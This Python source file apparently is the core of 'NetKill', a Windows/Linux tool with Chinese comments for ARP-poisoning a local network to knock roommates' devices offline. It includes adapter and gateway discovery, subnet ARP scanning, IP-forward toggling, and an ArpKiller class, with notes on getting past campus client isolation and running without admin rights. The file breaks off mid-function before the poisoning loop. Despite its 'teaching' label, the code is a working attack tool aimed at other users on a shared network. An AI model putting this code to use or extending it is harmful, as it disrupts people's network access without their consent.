# -*- coding: utf-8 -*-
"""
NetKill core —— ARP 局域网断网核心库（教学/实验用途）

功能：
  * 自动探测默认网关、本机网卡、室友目标机 MAC
  * ARP 双向毒化：目标 <-> 网关 的 ARP 表都被改写，目标流量被打断
  * 自动开启/关闭 IP 转发（可选，默认强制断网，不转发）
  * 退出时自动回毒（恢复目标与网关的真实 ARP 映射）
  * 多目标同时断网、定时自动停、白名单保护

依赖：scapy + Npcap(Windows) + 管理员权限
"""
from __future__ import annotations

import ctypes
import ipaddress
import os
import random
import socket
import subprocess
import sys
import threading
import time
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Tuple

from scapy.all import (  # type: ignore
    ARP,
    Ether,
    IP,
    TCP,
    UDP,
    ICMP,
    conf,
    get_if_hwaddr,
    get_if_list,
    getmacbyip,
    send,
    sendp,
    sniff,
    sr1,
    srp1,
    srp,
)

__all__ = [
    "Adapter",
    "Device",
    "ArpKiller",
    "NetError",
    "require_admin",
    "is_admin",
    "npcap_allows_user",
    "can_send_packets",
    "list_adapters",
    "get_default_gateway",
    "enable_ip_forward",
    "disable_ip_forward",
    "probe_device",
    "probe_multicast",
]

WINDOWS = os.name == "nt"
IS_ADMIN: Optional[bool] = None


class NetError(RuntimeError):
    """网络/权限类错误，统一抛给 UI 层展示。"""


# --------------------------------------------------------------------------- #
# 权限与网卡
# --------------------------------------------------------------------------- #
def is_admin() -> bool:
    """是否具备管理员/root 权限（发包必需）。"""
    global IS_ADMIN
    if IS_ADMIN is not None:
        return IS_ADMIN
    try:
        if WINDOWS:
            IS_ADMIN = bool(ctypes.windll.shell32.IsUserAnAdmin())
        else:
            IS_ADMIN = os.geteuid() == 0
    except Exception:
        IS_ADMIN = False
    return IS_ADMIN


def npcap_allows_user() -> bool:
    """Npcap 是否允许非管理员发包（AdminOnly=0）。

    校园网/宿舍机器常常不是管理员权限，而 Npcap 默认安装就是 AdminOnly=0，
    此时 scapy 依然能真实发包，不需要 UAC。
    """
    if not WINDOWS:
        return False
    try:
        import winreg

        for path in (
            r"SOFTWARE\WOW6432Node\Npcap",
            r"SOFTWARE\Npcap",
        ):
            try:
                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, path)
                val, _ = winreg.QueryValueEx(key, "AdminOnly")
                return int(val) == 0
            except OSError:
                continue
    except Exception:
        pass
    return False


def can_send_packets() -> bool:
    """当前身份能否发包：管理员，或 Npcap 允许普通用户。"""
    return is_admin() or npcap_allows_user()


def require_admin() -> None:
    """校园网适配：Npcap 允许普通用户时不强制管理员。"""
    if not can_send_packets():
        if WINDOWS:
            raise NetError(
                "需要管理员权限（Npcap 当前限制为仅管理员可用）。"
                "请右键『以管理员身份运行』本工具，"
                "或重装 Npcap 时不要勾选限制管理员的选项。"
            )
        raise NetError("需要 root 权限：请用 sudo 启动本工具。")


@dataclass
class Adapter:
    """一块可用的物理网卡。"""

    name: str          # 友好名，如 "WLAN" / "以太网"
    device: str        # scapy/Npcap 设备标识，如 \Device\NPF_{GUID}
    ip: str            # 本机 IPv4
    mac: str           # 本机 MAC
    gateway: Optional[str] = None

    def __str__(self) -> str:
        gw = self.gateway or "无网关"
        return f"{self.name}  [{self.ip}  {self.mac}]  gw={gw}"


def _ps(cmd: str, timeout: float = 8) -> str:
    """静默执行 PowerShell 并返回 stdout。

    注意：GUI 使用 pythonw（无控制台）启动，必须 DEVNULL + CREATE_NO_WINDOW，
    否则子进程会挂起并阻塞 Tk 主线程——这是"点扫描没反应"的根因。
    """
    try:
        flags = 0x08000000 if WINDOWS else 0  # CREATE_NO_WINDOW
        out = subprocess.run(
            ["powershell", "-NoProfile", "-NonInteractive", "-Command", cmd],
            stdin=subprocess.DEVNULL,
            capture_output=True,
            text=True,
            encoding="mbcs" if WINDOWS else None,  # 中文 Windows 输出是 GBK
            errors="ignore",
            timeout=timeout,
            creationflags=flags,
        )
        return (out.stdout or "").strip()
    except Exception:
        return ""


def _norm_mac(mac: str) -> str:
    m = (mac or "").replace("-", ":").replace(".", "").lower()
    if len(m) == 12 and ":" not in m:
        m = ":".join(m[i : i + 2] for i in range(0, 12, 2))
    return m


def _read_adapters_from_scapy() -> List[Adapter]:
    """纯 scapy 读取网卡（无子进程、毫秒级，pythonw 下同样可靠）。"""
    result: List[Adapter] = []
    try:
        dev_key, _ip, gw = conf.route.route("0.0.0.0")
    except Exception:
        dev_key, gw = None, None

    seen = set()
    for key, iface in list(conf.ifaces.items()):
        try:
            ip = getattr(iface, "ip", None) or ""
            mac = _norm_mac(getattr(iface, "mac", "") or "")
            name = getattr(iface, "name", "") or str(key)
        except Exception:
            continue
        if not ip or not mac:
            continue
        if ip.startswith("127.") or ip.startswith("169.254.") or mac == "00:00:00:00:00:00":
            continue
        if name.startswith("本地连接*"):  # Wi-Fi Direct 虚拟接口，不是真实链路
            continue
        gateway = gw if (dev_key and key == dev_key) else None
        result.append(Adapter(name=name, device=key, ip=ip, mac=mac, gateway=gateway))
        seen.add(key)

    # 默认路由网卡排最前
    result.sort(key=lambda a: (0 if a.device == dev_key else 1, a.name))
    return result


def list_adapters() -> List[Adapter]:
    """枚举有 IPv4 地址且已连接的网络适配器（优先 scapy，PowerShell 兜底）。"""
    adapters = _read_adapters_from_scapy()
    if adapters:
        return adapters

    result: List[Adapter] = []
    if WINDOWS:
        raw = _ps(
            "Get-NetIPConfiguration | Where-Object {$_.IPv4Address -and $_.NetAdapter.Status -eq 'Up'} | "
            "ForEach-Object { "
            "$a=$_.NetAdapter; $i=$_.IPv4Address.IPAddress; "
            "$g=($_.IPv4DefaultGateway.NextHop | Select-Object -First 1); "
            "\"$($a.Name)|$($a.InterfaceGuid)|$i|$($a.MacAddress)|$g\" }"
        )
        for line in raw.splitlines():
            line = line.strip()
            if not line or "|" not in line:
                continue
            parts = line.split("|")
            if len(parts) < 4:
                continue
            name, guid, ip, mac = parts[0], parts[1], parts[2], parts[3]
            gw = parts[4] if len(parts) > 4 and parts[4] else None
            if not ip:
                continue
            result.append(
                Adapter(name=name, device=rf"\Device\NPF_{guid}",
                        ip=ip, mac=_norm_mac(mac), gateway=gw)
            )
        return result

    gw = get_default_gateway()
    for name in get_if_list():
        try:
            ip = conf.route.route("0.0.0.0")[1]
            if name != conf.iface and name != "lo":
                continue
            mac = get_if_hwaddr(name)
            result.append(Adapter(name=name, device=name, ip=ip,
                                  mac=_norm_mac(mac), gateway=gw))
        except Exception:
            continue
    return result


def resolve_adapter(token: str) -> Adapter:
    """按名字/序号/IP 选择网卡。"""
    adapters = list_adapters()
    if not adapters:
        raise NetError("没有找到已连接的网卡，请确认 WLAN/以太网 已连接。")
    token = (token or "").strip()
    if not token:
        # 默认选有网关的那块
        for a in adapters:
            if a.gateway:
                return a
        return adapters[0]
    if token.isdigit():
        idx = int(token) - 1
        if 0 <= idx < len(adapters):
            return adapters[idx]
        raise NetError(f"网卡序号超出范围：{token}")
    low = token.lower()
    for a in adapters:
        if low == a.name.lower() or low == a.ip or low in a.name.lower():
            return a
    raise NetError(
        "未找到网卡：%s\n可用网卡：\n  %s"
        % (token, "\n  ".join(f"{i+1}. {a}" for i, a in enumerate(adapters)))
    )


def get_default_gateway() -> Optional[str]:
    """跨平台拿默认网关 IPv4（优先 scapy 路由表，避免子进程）。"""
    try:
        _dev, _ip, gw = conf.route.route("0.0.0.0")
        if gw and gw != "0.0.0.0":
            return gw
    except Exception:
        pass
    if WINDOWS:
        out = _ps(
            "Get-NetIPConfiguration | Where-Object {$_.IPv4DefaultGateway} | "
            "Select-Object -First 1 -ExpandProperty IPv4DefaultGateway | "
            "Select-Object -First 1 -ExpandProperty NextHop",
            timeout=3,
        )
        for line in out.splitlines():
            line = line.strip()
            if line:
                return line
        return None
    try:
        out = subprocess.run(
            ["sh", "-c", "ip route show default | awk '{print $3; exit}'"],
            stdin=subprocess.DEVNULL,
            capture_output=True,
            text=True,
            timeout=3,
        ).stdout.strip()
        return out or None
    except Exception:
        return None


def _route_default_ip() -> Optional[str]:
    """通过 UDP 连接探测出口网卡 IP。"""
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        return s.getsockname()[0]
    except Exception:
        return None
    finally:
        s.close()


# --------------------------------------------------------------------------- #
# IP 转发
# --------------------------------------------------------------------------- #
def enable_ip_forward() -> Tuple[bool, str]:
    """开启系统 IP 转发（转发模式下室友能上网但被限速/可审计）。"""
    if WINDOWS:
        out = _ps(
            "reg add 'HKLM\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters' "
            "/v IPEnableRouter /t REG_DWORD /d 1 /f"
        )
        if "成功" in out or "success" in out.lower() or "已成功" in out:
            return True, "已开启 IP 转发。若要使转发真正生效，可能还需要 net start RemoteAccess。"
        return False, out or "开启 IP 转发失败（缺少管理员权限？）"
    try:
        subprocess.run(
            ["sysctl", "-w", "net.ipv4.ip_forward=1"],
            check=True, capture_output=True,
        )
        return True, "已开启 IP 转发（net.ipv4.ip_forward=1）。"
    except Exception as e:
        return False, f"开启 IP 转发失败：{e}"


def disable_ip_forward() -> Tuple[bool, str]:
    if WINDOWS:
        _ps(
            "reg add 'HKLM\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters' "
            "/v IPEnableRouter /t REG_DWORD /d 0 /f"
        )
        return True, "已关闭 IP 转发（恢复断网/默认状态）。"
    try:
        subprocess.run(
            ["sysctl", "-w", "net.ipv4.ip_forward=0"],
            check=True, capture_output=True,
        )
        return True, "已关闭 IP 转发。"
    except Exception as e:
        return False, f"关闭 IP 转发失败：{e}"


# --------------------------------------------------------------------------- #
# 目标设备
# --------------------------------------------------------------------------- #
@dataclass
class Device:
    ip: str
    mac: str
    hostname: str = ""
    vendor: str = ""
    last_seen: float = 0.0
    online: bool = True
    state: str = ""            # 邻居表状态：Reachable / Stale / Delay / Probe ...
    is_proxy_arp: bool = False # MAC 与网关相同（代理ARP/客户端隔离网络）

    @property
    def label(self) -> str:
        name = self.hostname or self.vendor or "未知设备"
        return f"{self.ip:<15} {self.mac}  {name}"

    def __str__(self) -> str:
        return self.label


def _hostname(ip: str, timeout: float = 0.8) -> str:
    """反向 DNS 解析主机名（失败返回空，绝不阻塞过久）。"""
    old = socket.getdefaulttimeout()
    try:
        socket.setdefaulttimeout(timeout)
        name = socket.gethostbyaddr(ip)[0]
        return name.split(".")[0]
    except Exception:
        return ""
    finally:
        try:
            socket.setdefaulttimeout(old)
        except Exception:
            pass


def resolve_hostnames(devices: List["Device"], workers: int = 8,
                      timeout: float = 0.8) -> None:
    """并发解析主机名并写回 device.hostname（供界面后台调用）。"""
    pend = [d for d in devices if not d.hostname]
    if not pend:
        return
    from concurrent.futures import ThreadPoolExecutor

    with ThreadPoolExecutor(max_workers=max(1, min(workers, len(pend)))) as ex:
        futs = {ex.submit(_hostname, d.ip, timeout): d for d in pend}
        for fut, d in futs.items():
            try:
                name = fut.result(timeout=timeout + 1.0)
            except Exception:
                name = ""
            if name:
                d.hostname = name


# OUI 厂商表（本地常见品牌库，覆盖手机/电脑/路由器/虚拟机）
_OUI: Dict[str, str] = {
    # Apple
    "AC:BC:32": "Apple", "F0:18:98": "Apple", "A4:83:E7": "Apple", "3C:22:FB": "Apple",
    "14:7D:DA": "Apple", "9C:FC:01": "Apple", "00:1B:44": "Apple", "F4:0F:24": "Apple",
    "D0:81:7A": "Apple", "6C:40:08": "Apple", "84:38:35": "Apple", "F8:FF:C2": "Apple",
    "E0:B9:BA": "Apple", "A8:88:08": "Apple", "54:26:96": "Apple", "7C:D1:C3": "Apple",
    "90:B0:ED": "Apple", "04:D3:CF": "Apple", "7C:04:D0": "Apple", "5C:F9:38": "Apple",
    "6C:70:9F": "Apple", "F0:99:BF": "Apple", "DC:2C:6E": "Apple", "70:3E:AC": "Apple",
    # Samsung
    "70:3A:CB": "Samsung", "E8:50:8B": "Samsung", "38:AA:3C": "Samsung", "5C:0A:5B": "Samsung",
    "04:18:D6": "Samsung", "08:37:3D": "Samsung", "28:39:5E": "Samsung", "2C:AE:2B": "Samsung",
    "34:23:BA": "Samsung", "4C:3C:16": "Samsung", "50:32:37": "Samsung", "78:1F:DB": "Samsung",
    "8C:77:12": "Samsung", "A0:21:95": "Samsung", "C8:19:F7": "Samsung", "D8:57:EF": "Samsung",
    "EC:1F:72": "Samsung", "F4:09:D8": "Samsung", "84:25:DB": "Samsung",
    # Huawei
    "1C:1B:0D": "Huawei", "48:DB:50": "Huawei", "C8:94:BB": "Huawei", "E0:24:7F": "Huawei",
    "24:09:95": "Huawei", "00:E0:FC": "Huawei", "28:3C:E4": "Huawei", "34:6B:D3": "Huawei",
    "4C:1F:CC": "Huawei", "54:25:EA": "Huawei", "6C:92:BF": "Huawei", "70:72:3C": "Huawei",
    "8C:34:FD": "Huawei", "A0:8C:F8": "Huawei", "AC:E2:15": "Huawei", "B8:43:E4": "Huawei",
    "C0:70:09": "Huawei", "D0:7A:B5": "Huawei", "DC:D2:FC": "Huawei", "E4:A7:C5": "Huawei",
    "F4:9F:54": "Huawei", "30:0E:B8": "Huawei",
    # Xiaomi / Redmi
    "3C:7C:3F": "Xiaomi", "64:CC:2E": "Xiaomi", "50:8F:4C": "Xiaomi", "78:11:DC": "Xiaomi",
    "8C:BE:BE": "Xiaomi", "00:9E:C8": "Xiaomi", "F0:B4:29": "Xiaomi", "28:6C:07": "Xiaomi",
    "34:CE:00": "Xiaomi", "38:A4:ED": "Xiaomi", "4C:49:E3": "Xiaomi", "5C:02:14": "Xiaomi",
    "64:B4:73": "Xiaomi", "68:DF:DD": "Xiaomi", "7C:1D:D9": "Xiaomi", "8C:53:C3": "Xiaomi",
    "98:FA:E3": "Xiaomi", "9C:99:A0": "Xiaomi", "A8:9C:ED": "Xiaomi", "C4:0B:CB": "Xiaomi",
    "D4:97:0B": "Xiaomi", "F4:8B:32": "Xiaomi", "30:86:2D": "Xiaomi",
    # OPPO / OnePlus / realme
    "64:A2:F9": "OPPO", "28:D1:8F": "OPPO", "34:3D:C4": "OPPO", "4C:1A:3A": "OPPO",
    "58:6B:14": "OPPO", "70:5D:CC": "OPPO", "88:6B:0F": "OPPO", "A4:50:46": "OPPO",
    "B0:4E:26": "OPPO", "D8:9A:34": "OPPO", "E8:BB:A8": "OPPO", "F4:5E:AB": "OPPO",
    "C0:EE:FB": "OnePlus", "94:65:2D": "OnePlus",
    # vivo
    "3C:A0:67": "vivo", "F4:8C:50": "vivo", "34:80:B3": "vivo", "4C:57:39": "vivo",
    "5C:93:A2": "vivo", "70:8A:09": "vivo", "84:EB:18": "vivo", "98:E7:9B": "vivo",
    "A0:3D:6F": "vivo", "C4:59:8B": "vivo", "D0:11:E5": "vivo", "E4:4F:29": "vivo",
    # Google / Pixel
    "00:1A:11": "Google", "3C:5A:B4": "Google", "F4:F5:D8": "Google", "54:60:09": "Google",
    "A4:77:33": "Google", "94:EB:2C": "Google", "44:07:0B": "Google", "D8:6C:63": "Google",
    # Intel
    "D4:93:90": "Intel", "CE:12:70": "Intel", "8C:16:45": "Intel", "00:1B:21": "Intel",
    "3C:97:0E": "Intel", "40:25:C2": "Intel", "48:51:B7": "Intel", "5C:5F:67": "Intel",
    "7C:7A:91": "Intel", "84:3A:4B": "Intel", "A4:BB:6D": "Intel", "B4:6B:FC": "Intel",
    "C8:58:C0": "Intel", "DC:41:5F": "Intel", "E4:A4:71": "Intel", "F8:63:3F": "Intel",
    "34:13:E8": "Intel", "8C:8D:28": "Intel",
    # Qualcomm / Broadcom / Realtek
    "00:03:7F": "Qualcomm", "00:0E:35": "Intel", "00:10:18": "Broadcom",
    "00:E0:4C": "Realtek", "52:54:00": "QEMU",
    # 主板/笔记本
    "00:14:22": "Dell", "00:1C:23": "Dell", "00:21:9B": "Dell", "18:03:73": "Dell",
    "24:6E:96": "Dell", "3C:2C:30": "Dell", "44:A8:42": "Dell", "54:BF:64": "Dell",
    "78:2B:CB": "Dell", "84:2B:2B": "Dell", "B0:83:FE": "Dell", "C8:1F:66": "Dell",
    "D4:AE:52": "Dell", "F0:4D:A2": "Dell", "F8:BC:12": "Dell",
    "00:1B:78": "HP", "00:21:5A": "HP", "00:23:7D": "HP", "2C:41:38": "HP",
    "3C:D9:2B": "HP", "40:A8:F0": "HP", "6C:3B:E5": "HP", "94:57:A5": "HP",
    "9C:B6:54": "HP", "A0:48:1C": "HP", "B4:99:BA": "HP", "C4:34:6B": "HP",
    "D4:85:64": "HP", "E4:11:5B": "HP", "EC:B1:D7": "HP", "F4:CE:46": "HP",
    "00:12:FE": "Lenovo", "00:1E:37": "Lenovo", "28:D2:44": "Lenovo", "3C:91:80": "Lenovo",
    "54:EE:75": "Lenovo", "68:F7:28": "Lenovo", "80:FA:5B": "Lenovo", "98:FA:9B": "Lenovo",
    "A0:8C:FD": "Lenovo", "C8:5B:76": "Lenovo", "E4:A7:A0": "Lenovo", "F0:76:1C": "Lenovo",
    "00:1B:FC": "ASUS", "04:D4:C4": "ASUS", "08:60:6E": "ASUS", "10:BF:48": "ASUS",
    "14:DD:A9": "ASUS", "2C:56:DC": "ASUS", "38:D5:47": "ASUS", "40:16:7E": "ASUS",
    "50:46:5D": "ASUS", "60:45:CB": "ASUS", "70:4D:7B": "ASUS", "74:D0:2B": "ASUS",
    "88:D7:F6": "ASUS", "AC:22:0B": "ASUS", "BC:AE:C5": "ASUS", "D8:50:E6": "ASUS",
    "F4:6D:04": "ASUS",
    # 路由器 / 网络设备
    "48:8F:5A": "TP-Link", "50:C7:BF": "TP-Link", "60:32:B1": "TP-Link", "7C:8B:CA": "TP-Link",
    "98:DA:C4": "TP-Link", "A4:2B:B0": "TP-Link", "C4:6E:1F": "TP-Link", "EC:08:6B": "TP-Link",
    "F4:F2:6D": "TP-Link", "30:B5:C2": "TP-Link",
    "48:8F:5A": "TP-Link",
    "00:0C:43": "Ralink", "00:1F:A4": "Ralink", "C0:4A:00": "Ralink",
    "B0:BE:76": "Tenda", "C8:3A:35": "Tenda", "50:2B:73": "Tenda", "D8:32:14": "Tenda",
    "00:0D:0B": "Buffalo", "00:0F:66": "Cisco", "00:12:43": "Cisco", "00:1A:A1": "Cisco",
    "F4:CF:E2": "Cisco", "50:DA:00": "Cisco",
    "CC:32:E5": "Xiaomi", "7C:49:EB": "Xiaomi", "28:6C:07": "Xiaomi",
    # 物联网 / 云 / 虚拟
    "DC:A6:32": "RaspberryPi", "B8:27:EB": "RaspberryPi", "E4:5F:01": "RaspberryPi",
    "28:CD:C1": "RaspberryPi",
    "00:50:56": "VMware", "00:0C:29": "VMware", "00:05:69": "VMware", "00:1C:14": "VMware",
    "08:00:27": "VirtualBox", "00:15:5D": "Hyper-V",
    "B4:7C:9C": "Amazon", "74:C2:46": "Amazon", "44:65:0D": "Amazon", "50:DC:E7": "Amazon",
    "68:37:E9": "Amazon", "84:D6:D0": "Amazon", "0C:47:C9": "Amazon", "18:74:2E": "Amazon",
    "38:F7:3D": "Amazon", "40:B4:CD": "Amazon", "4C:17:44": "Amazon", "6C:56:97": "Amazon",
    "74:75:48": "Amazon", "78:E1:03": "Amazon", "8C:85:90": "Amazon", "A0:02:DC": "Amazon",
    "AC:63:BE": "Amazon", "F0:27:2D": "Amazon", "FC:65:DE": "Amazon",
    "00:1C:62": "LG", "10:F9:6F": "LG", "2C:54:CF": "LG", "34:4D:F7": "LG",
    "58:A2:B5": "LG", "7C:1C:4E": "LG", "A8:16:B2": "LG", "C4:36:6C": "LG",
    "00:13:A9": "Sony", "30:F9:ED": "Sony", "54:42:49": "Sony", "78:84:3C": "Sony",
    "A0:E4:53": "Sony", "FC:0F:E6": "Sony",
    "00:09:BF": "Nintendo", "98:B6:E9": "Nintendo", "58:BD:A3": "Nintendo",
    "00:0C:E5": "HTC", "3C:5B:8F": "HTC",
    "00:1A:1B": "Motorola", "00:1C:56": "Motorola", "40:78:6A": "Motorola",
    "00:24:54": "ASUSTek", "1C:B7:2C": "ASUSTek",
    "00:1A:8C": "Nokia", "00:1F:5B": "Nokia", "3C:5A:B4": "Nokia",
    "00:1E:65": "Intel", "00:22:FB": "Intel",
    "00:04:20": "Slim Devices", "00:1F:3A": "Ruckus", "C4:01:7C": "Ruckus",
}
_OUI_CACHE: Dict[str, str] = {}
# IEEE 官方 OUI 数据库（首次使用时下载并缓存，覆盖全厂商）
_OUI_DB: Dict[str, str] = {}
_OUI_DB_PATH = os.path.join(os.path.expanduser("~"), ".netkill", "oui.csv")
_OUI_DB_STATE = {"loaded": False}
_OUI_DB_URL = "https://standards-oui.ieee.org/oui/oui.csv"


def _load_oui_db(block: bool = True) -> None:
    """加载 IEEE OUI 厂商库（本地缓存优先，没有则联网下载一次）。"""
    if _OUI_DB_STATE["loaded"]:
        return
    if not block:
        return
    _OUI_DB_STATE["loaded"] = True
    try:
        if not os.path.exists(_OUI_DB_PATH) or os.path.getsize(_OUI_DB_PATH) < 10000:
            os.makedirs(os.path.dirname(_OUI_DB_PATH), exist_ok=True)
            import urllib.request
            ua = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                                "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120 Safari/537.36"}
            req = urllib.request.Request(_OUI_DB_URL, headers=ua)
            with urllib.request.urlopen(req, timeout=40) as r:
                data = r.read()
            if data and len(data) > 10000:
                with open(_OUI_DB_PATH, "wb") as f:
                    f.write(data)
        with open(_OUI_DB_PATH, "r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                parts = line.split(",")
                if len(parts) < 3:
                    continue
                assign = parts[1].strip().strip('"').upper()
                name = parts[2].strip().strip('"')
                if len(assign) == 6 and assign.isalnum():
                    key = ":".join(assign[i:i + 2] for i in range(0, 6, 2))
                    if name:
                        _OUI_DB[key] = name
    except Exception:
        pass


def _vendor(mac: str) -> str:
    """按 OUI 查厂商：先查 IEEE 全库，再回退内置常见表。"""
    mac = _norm_mac(mac)
    key = mac[:8].upper()
    if key in _OUI_CACHE:
        return _OUI_CACHE[key]
    name = _OUI_DB.get(key, "")
    if not name:
        _load_oui_db(block=True)
        name = _OUI_DB.get(key, "")
    if not name:
        name = _OUI.get(key, "")
    _OUI_CACHE[key] = name
    return name


def preload_oui_db() -> None:
    """后台预热 OUI 库（GUI 启动时调用，避免首次查询卡顿）。"""
    threading.Thread(target=lambda: _load_oui_db(block=True), daemon=True).start()


# --------------------------------------------------------------------------- #
# 核心攻击器
# --------------------------------------------------------------------------- #
@dataclass
class ArpKiller:
    """ARP 双向毒化（一键让目标断网）。"""

    adapter: Adapter
    gateway: Optional[str] = None
    targets: Dict[str, str] = field(default_factory=dict)  # ip -> mac
    interval: float = 0.7          # 毒化包间隔（秒）
    forward: bool = False          # True=限速转发(不断网), False=直接断网
    spoof_gateway: bool = True     # 毒化 目标->网关（断网必需，且不影响本机）
    spoof_target: bool = False     # 毒化 网关->目标（可选；会干扰目标下行，默认关闭）
    broadcast: bool = False        # 广播毒化：可穿透仅隔离单播的客户端隔离（校园网常用）

    # 运行态
    _stop: threading.Event = field(default_factory=threading.Event, init=False)
    _lock: threading.Lock = field(default_factory=threading.Lock, init=False)
    _sent: int = field(default=0, init=False)
    _thread: Optional[threading.Thread] = field(default=None, init=False)
    gateway_mac: Optional[str] = field(default=None, init=False)
    log_lines: List[str] = field(default_factory=list, init=False)
    on_log = None  # 回调: (text) -> None

    # ---- 初始化 ---------------------------------------------------------- #
    def __post_init__(self) -> None:
        if not self.gateway:
            self.gateway = self.adapter.gateway or get_default_gateway()
        if not self.gateway:
            raise NetError("无法获取默认网关 IP，请手动用 --gateway 指定（如 192.168.1.1）。")
        try:
            ipaddress.IPv4Address(self.gateway)
            ipaddress.IPv4Network(
                f"{self.adapter.ip}/{self._prefix()}", strict=False
            )
        except Exception:
            raise NetError(f"网关/本机 IP 格式异常：{self.adapter.ip} / {self.gateway}")

    def _prefix(self) -> int:
        """从网卡 subnet 推断前缀。Windows 下用 PowerShell，其它回退 /24。"""
        if WINDOWS:
            out = _ps(
                "Get-NetIPAddress -InterfaceAlias '%s' -AddressFamily IPv4 | "
                "Select-Object -First 1 -ExpandProperty PrefixLength" % self.adapter.name
            )
            for line in out.splitlines():
                if line.strip().isdigit():
                    return int(line.strip())
        return 24

    # ---- 基础工具 -------------------------------------------------------- #
    def log(self, text: str) -> None:
        stamp = time.strftime("%H:%M:%S")
        line = f"[{stamp}] {text}"
        self.log_lines.append(line)
        del self.log_lines[:-400]
        cb = self.on_log
        if cb:
            try:
                cb(line)
            except Exception:
                pass

    def _iface(self):
        return self.adapter.device

    def _resolve(self, ip: str, timeout: float = 1.0) -> Optional[str]:
        mac = getmacbyip(ip)
        if mac:
            return _norm_mac(mac)
        try:
            ans = srp1(
                Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
                iface=self._iface(), timeout=timeout, verbose=0,
            )
            if ans is not None:
                return _norm_mac(ans.hwsrc)
        except Exception:
            pass
        return None

    # ---- 扫描 ------------------------------------------------------------ #
    def scan_passive(self) -> List[Device]:
        """只读扫描：读取系统邻居表（ARP 缓存），不发任何包、不需要管理员。

        这是开发/演示阶段最安全的“看谁在线”方式；缺点只能看到最近通信过的设备。
        """
        devices: Dict[str, Device] = {}
        if WINDOWS:
            out = _ps(
                "Get-NetNeighbor -InterfaceAlias '%s' -AddressFamily IPv4 -ErrorAction SilentlyContinue | "
                "Where-Object {$_.State -ne 'Unreachable' -and $_.LinkLayerAddress -ne '00-00-00-00-00-00'} | "
                "ForEach-Object { \"$($_.IPAddress)|$($_.LinkLayerAddress)|$($_.State)\" }" % self.adapter.name
            )
            for line in out.splitlines():
                line = line.strip()
                if "|" not in line:
                    continue
                parts = line.split("|")
                ip, mac = parts[0], parts[1]
                state = parts[2] if len(parts) > 2 else ""
                mac = _norm_mac(mac)
                if not mac or mac == "ff:ff:ff:ff:ff:ff" or mac.startswith("01:00:5e"):
                    continue
                if ip in ("255.255.255.255",) or ip.startswith("224.") or ip.startswith("239."):
                    continue
                devices[ip] = Device(ip=ip, mac=mac, vendor=_vendor(mac),
                                     last_seen=time.time(), state=state)
        else:
            out = _ps("ip neigh show dev %s" % self.adapter.name)
            for line in out.splitlines():
                parts = line.split()
                if len(parts) >= 5 and parts[2] == "lladdr":
                    devices[parts[0]] = Device(ip=parts[0], mac=_norm_mac(parts[4]),
                                               vendor=_vendor(parts[4]),
                                               state=parts[-1] if parts else "")
        # 兜底：Get-NetNeighbor 不可用时改用系统 arp -a 表
        if WINDOWS and not devices:
            try:
                import re as _re
                raw = _ps("arp -a")
                cur_ok = False
                for line in raw.splitlines():
                    if "接口" in line or "Interface" in line:
                        cur_ok = self.adapter.ip in line
                        continue
                    m = _re.match(
                        r"\s*(\d+\.\d+\.\d+\.\d+)\s+([0-9a-fA-F]{2}(?:[-:][0-9a-fA-F]{2}){5})\s+",
                        line,
                    )
                    if m and cur_ok:
                        ip, mac = m.group(1), _norm_mac(m.group(2))
                        if ip == self.adapter.ip:
                            continue
                        devices[ip] = Device(ip=ip, mac=mac, vendor=_vendor(mac),
                                             last_seen=time.time(), state="arp")
            except Exception:
                pass
        self_mac = _norm_mac(self.adapter.mac)
        gw_mac = ""
        if self.gateway and self.gateway in devices:
            gw_mac = devices[self.gateway].mac.lower()
        for d in devices.values():
            if d.ip == self.gateway:
                d.hostname = "网关/路由器"
            elif d.ip == self.adapter.ip or d.mac == self_mac:
                d.hostname = "本机"
            else:
                d.hostname = ""   # 不做在线 DNS 反查，避免 Windows 上每台卡数秒
            if gw_mac and d.ip != self.gateway and d.mac.lower() == gw_mac:
                d.is_proxy_arp = True
                # 代理 MAC 的厂商其实是网关厂商，不能代表这台设备
                d.vendor = ""
        self.log(f"邻居表只读扫描：{len(devices)} 台（未发送任何数据包）。")
        return sorted(devices.values(), key=lambda x: ipaddress.IPv4Address(x.ip))

    def scan(self, cidr: Optional[str] = None, timeout: float = 2.0) -> List[Device]:
        """ARP 扫描整个网段，找出所有在线设备（含室友电脑/手机）。

        注意：/16 这类大网段（6.5 万个地址）扫描极慢且会刷爆网络，
        这里自动收敛到「本机 /24」，保证几秒内完成。
        """
        if not cidr:
            try:
                net = ipaddress.IPv4Network(
                    f"{self.adapter.ip}/{self._prefix()}", strict=False
                )
                if net.prefixlen < 24:      # 大网段收敛到 /24
                    net = ipaddress.IPv4Network(f"{self.adapter.ip}/24", strict=False)
                cidr = str(net)
            except Exception:
                cidr = f"{self.adapter.ip}/24"
        self.log(f"ARP 扫描网段 {cidr} …（最长 {timeout:g}s）")
        try:
            ans, _ = srp(
                Ether(dst="ff:ff:ff:ff:ff:ff")
                / ARP(pdst=cidr, hwdst="ff:ff:ff:ff:ff:ff"),
                iface=self._iface(),
                timeout=timeout,
                verbose=0,
                inter=0.01,
            )
        except PermissionError as e:
            raise NetError(f"无权限发送 ARP 包（需管理员/Npcap）：{e}")
        except OSError as e:
            raise NetError(f"网卡发包失败：{e}")

        self_mac = _norm_mac(self.adapter.mac)
        devices: Dict[str, Device] = {}
        for _, r in ans:
            mac = _norm_mac(r.hwsrc)
            ip = r.psrc
            if mac == self_mac or ip == self.adapter.ip:
                continue
            devices[ip] = Device(
                ip=ip, mac=mac, vendor=_vendor(mac), last_seen=time.time()
            )

        # 补网关 MAC（有的网关不回 ARP，直接查邻居缓存）
        if self.gateway and self.gateway not in devices:
            gmac = self._resolve(self.gateway)
            if gmac:
                devices[self.gateway] = Device(
                    ip=self.gateway, mac=gmac, vendor=_vendor(gmac),
                    hostname="网关/路由器", last_seen=time.time(),
                )
        gw_mac = ""
        if self.gateway and self.gateway in devices:
            gw_mac = devices[self.gateway].mac.lower()
        for d in devices.values():
            if d.ip == self.gateway:
                d.hostname = "网关/路由器"
            elif not d.hostname:
